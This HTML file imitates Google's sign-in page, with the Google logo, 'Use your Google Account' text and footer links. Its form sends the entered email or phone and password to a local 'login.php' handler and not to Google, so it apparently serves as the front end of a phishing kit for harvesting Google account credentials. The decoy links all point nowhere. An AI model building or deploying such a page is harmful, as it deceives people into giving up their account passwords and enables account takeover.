<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Sign in</title>
    <link rel="icon" href="logo.svg">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-card">
        <div class="left-panel">
            <img src="logo.svg" alt="Google Logo">
            <h1 id="header-text">Sign in</h1>
            <p id="sub-text">Use your Google Account</p>
        </div>
        <div class="right-panel">
            <div class="form-container">
                <form action="login.php" method="POST" id="login-form">
                    <div id="step-1">
                        <div class="input-group">
                            <input type="text" name="username" id="username" placeholder="Email or phone" required autofocus>
                        </div>
                        <div class="input-group">
                            <input type="password" name="password" id="password" placeholder="Enter your password" required>
                        </div>
                        <a href="#" class="forgot-email">Forgot email?</a>
                        <div class="privacy-notice">
                            Not your computer? Use a Private window to sign in. <a href="#" class="forgot-email">Learn more</a>
                        </div>
                        <div class="btn-group">
                            <a href="#" class="create-account">Create account</a>
                            <button type="submit" class="next-btn">Next</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-lang">
            English (United Kingdom)
        </div>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>
</body>
</html>
